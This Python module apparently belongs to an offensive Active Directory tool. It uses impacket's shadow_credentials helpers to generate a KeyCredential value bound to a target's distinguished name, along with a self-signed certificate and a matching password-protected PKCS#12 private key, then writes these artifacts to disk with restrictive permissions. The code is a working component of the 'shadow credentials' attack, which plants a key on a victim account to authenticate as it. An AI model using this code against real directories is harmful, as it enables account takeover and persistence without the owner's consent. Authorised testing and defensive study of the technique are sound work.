from __future__ import annotations

import json
import os
import tempfile
import uuid
from dataclasses import dataclass
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from impacket.examples.ntlmrelayx.utils import shadow_credentials


@dataclass(frozen=True)
class ShadowCredentialMaterial:
    key_credential_value: str
    pfx_bytes: bytes
    device_id: str


def generate_shadow_credential(
    *,
    subject: str,
    owner_dn: str,
    pfx_password: str,
) -> ShadowCredentialMaterial:
    """Generate a KeyCredential value and its matching PKCS#12 private key."""
    if not pfx_password:
        raise ValueError("the PKCS#12 password must not be empty")
    key, certificate = shadow_credentials.createSelfSignedX509Certificate(
        subject=subject
    )
    device_id = shadow_credentials.getDeviceId()
    key_credential = shadow_credentials.KeyCredential(
        key,
        deviceId=device_id,
        currentTime=shadow_credentials.getTicksNow(),
    )
    value = shadow_credentials.toDNWithBinary2String(
        key_credential.dumpBinary(),
        owner_dn,
    )
    pfx_bytes = pkcs12.serialize_key_and_certificates(
        name=subject.encode("utf-8"),
        key=key,
        cert=certificate,
        cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(
            pfx_password.encode("utf-8")
        ),
    )
    return ShadowCredentialMaterial(
        key_credential_value=value,
        pfx_bytes=pfx_bytes,
        device_id=str(uuid.UUID(bytes=device_id)),
    )


def secure_write(path: Path, data: bytes, *, mode: int = 0o600) -> None:
    """Atomically write a private artifact with restrictive permissions."""
    path.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    os.chmod(path.parent, 0o700)
    fd, tmp_name = tempfile.mkstemp(prefix=f".{path.name}.", suffix=".tmp", dir=path.parent)
    tmp_path = Path(tmp_name)
    try:
        with os.fdopen(fd, "wb") as handle:
            handle.write(data)
            handle.flush()
            os.fsync(handle.fileno())
        os.chmod(tmp_path, mode)
        os.replace(tmp_path, path)
        os.chmod(path, mode)
    except Exception:
        try:
            tmp_path.unlink()
        except FileNotFoundError:
            pass
        raise


def secure_write_json(path: Path, payload: object) -> None:
    secure_write(
        path,
        (json.dumps(payload, indent=2, default=str) + "\n").encode("utf-8"),
    )

